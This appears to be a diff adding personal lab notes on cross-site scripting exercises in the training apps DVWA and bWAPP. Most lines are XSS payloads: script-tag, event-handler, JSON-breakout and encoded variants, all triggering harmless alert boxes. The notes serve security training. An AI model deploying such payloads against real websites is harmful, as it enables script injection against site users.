@@ -1,0 +1,22 @@
+A7 (Cross site scripting)
+		* Cross Site Scripting GET - DVWA
+		* Cross Site Scripting POST - bWAPP
+		* Cross Site Scripting STORE - DVWA
+			- http://192.168.18.36/DVWA/vulnerabilities/xss_r/?name="><script>alert(1)</script>
+			- </pre><img onDblClick=a&#x6c;ert`1` src=a> PWN!<!--
+			- </pre><svg width="200" height="100" onload=alert(1)>
+
+		* Cross Site Scripting JSON - bWAPP
+			- base4sec"}]}';alert(1);//
+
+		* Cross Site Scripting AJAX - bWAPP
+			- &lt;img src=x onerror=alert(&#39;1&#39;)&gt;
+
+		* XSS - Reflected (User-Agent) - bWAPP
+			- <svg/onmouseover=alert(1)>
+
+		* XSS - Reflected (Referer) - bWAPP
+		* XSS - Reflected (Back Button)
+			- <a href="#" onclick=confirm(1)>base4sec</a>
+
+https://www.convertstring.com/es/EncodeDecode/HtmlEncode
